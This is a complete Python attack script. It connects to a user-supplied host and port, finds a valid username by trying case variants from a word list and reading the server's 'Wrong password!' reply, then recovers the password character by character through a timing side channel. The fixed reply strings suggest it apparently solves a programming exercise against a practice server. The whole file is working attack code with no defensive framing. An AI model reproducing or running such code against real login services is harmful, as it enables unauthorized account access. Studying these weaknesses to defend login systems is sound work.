import itertools
import json
import socket
import sys
import string
import time


def logins_json(client):
    with open("logins.txt", mode='r', encoding="utf-8") as file:
        for login in file:
            login = login.strip('\n')
            for i in itertools.product(*zip(login.upper(), login.lower())):
                result = {"login": "".join(i), "password": ''}
                result_json = json.dumps(result)
                client.send(result_json.encode())
                response = json.loads(client.recv(1024).decode())
                if response["result"] == "Wrong password!":
                    return "".join(i)


def brute_force(client, login):
    password = ""
    numbers_letters = string.ascii_letters + string.digits
    while True:
        list_time = []
        for i in numbers_letters:
            result = {"login": login, "password": password + i}
            result_json = json.dumps(result)
            start = time.perf_counter()
            client.send(result_json.encode())
            response = json.loads(client.recv(1024).decode())
            end = time.perf_counter()
            list_time.append(end - start)
            if response["result"] == "Connection success!":
                return password + i
        password += numbers_letters[max(range(len(list_time)), key=lambda x: list_time[x])]


def main():
    args = sys.argv
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    with socket.socket() as client:
        client.connect(address)
        login = logins_json(client)
        password = brute_force(client, login)
        print(json.dumps({"login": login, "password": password}))


if __name__ == '__main__':
    main()
